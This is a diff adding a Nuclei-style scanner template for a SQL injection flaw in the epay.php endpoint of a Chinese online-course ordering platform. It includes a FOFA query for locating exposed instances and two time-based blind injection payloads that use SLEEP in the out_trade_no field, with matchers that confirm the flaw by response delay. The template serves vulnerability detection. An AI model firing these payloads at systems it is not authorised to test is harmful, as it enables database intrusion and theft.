@@ -1,0 +1,46 @@
+id: 29wangke-epay-sql-injection
+
+info:
+  name: "29 网课交单平台 epay.php 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="Ashx/Usermanager.ashx"
+      该接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句绕过身份验证，进而获取数据库敏感信息。成功利用该漏洞可导致数据库内容泄露，并可能通过数据库提权操作获取服务器控制权限，对系统安全构成严重威胁。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484245&idx=1&sn=90d5ff30be0453c08ee7161c92a50267&chksm=c267b666f5103f706f760459162b88cd12e1dcd2d168f12eec782f5b8fd9689914feb6282090&token=1619136955&lang=zh_CN#rd
+  tags: 29网课交单平台
+
+http:
+- raw:
+  - |
+    POST /epay/epay.php HTTP/1.1 
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Content-Type: application/x-www-form-urlencoded
+
+    out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(4)))eEcA) AND 'aEmC'='aEmC
+  - |
+    POST /epay/epay.php HTTP/1.1 
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Content-Type: application/x-www-form-urlencoded
+
+    out_trade_no=' AND (SELECT 8078 FROM (SELECT(SLEEP(8)))eEcA) AND 'aEmC'='aEmC
+  matchers-condition: and
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
